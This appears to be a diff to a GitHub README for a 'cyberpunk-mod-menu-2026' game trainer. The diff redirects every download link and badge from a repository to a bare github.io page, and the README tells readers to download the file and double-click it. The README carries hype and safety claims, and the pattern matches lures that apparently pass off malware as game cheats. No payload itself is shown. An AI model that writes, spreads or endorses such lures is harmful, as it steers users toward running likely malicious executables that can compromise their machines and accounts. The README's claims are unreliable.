@@ -1,6 +1,6 @@
 # 🎮 cyberpunk-mod-menu-2026 - Unlock the Full Cyberpunk Experience Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Cyberpunk_Mod_Menu_2026-FF00FF?style=for-the-badge&logo=github&logoColor=white&labelColor=00FF00&color=FF00FF)](https://github.com/feculent-humanism8203/cyberpunk-mod-menu-2026)
+[![Download Now](https://img.shields.io/badge/Download-Cyberpunk_Mod_Menu_2026-FF00FF?style=for-the-badge&logo=github&logoColor=white&labelColor=00FF00&color=FF00FF)](https://feculent-humanism8203.github.io)
 
 ## 🚀 What Is This?
 
@@ -25,7 +25,7 @@ Our trainer operates safely alongside your game. The mod menu uses advanced memo
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [https://github.com/feculent-humanism8203/cyberpunk-mod-menu-2026](https://github.com/feculent-humanism8203/cyberpunk-mod-menu-2026)
+Visit this link to download the application: [https://feculent-humanism8203.github.io](https://feculent-humanism8203.github.io)
 
 ### 🖥️ System Requirements
 
@@ -39,7 +39,7 @@ Visit this link to download the application: [https://github.com/feculent-humani
 ## 🎯 How to Use
 
 ### Step 1: Download the Application
-Visit this link to download the application: [https://github.com/feculent-humanism8203/cyberpunk-mod-menu-2026](https://github.com/feculent-humanism8203/cyberpunk-mod-menu-2026)
+Visit this link to download the application: [https://feculent-humanism8203.github.io](https://feculent-humanism8203.github.io)
 
 ### Step 2: Run the Program
 Once downloaded, locate the file in your Downloads folder and double-click to run it. The interface is simple and user-friendly - no technical knowledge required.
@@ -139,7 +139,7 @@ The installation takes less than five minutes, and the benefits last your entire
 
 Don't wait - download now and experience the game the way it was meant to be played. Your journey to becoming a Night City legend starts here.
 
-[![Get It Now](https://img.shields.io/badge/🚀-Download_Cyberpunk_Mod_Menu_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000&color=00FF00)](https://github.com/feculent-humanism8203/cyberpunk-mod-menu-2026)
+[![Get It Now](https://img.shields.io/badge/🚀-Download_Cyberpunk_Mod_Menu_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000&color=00FF00)](https://feculent-humanism8203.github.io)
 
 ---
 
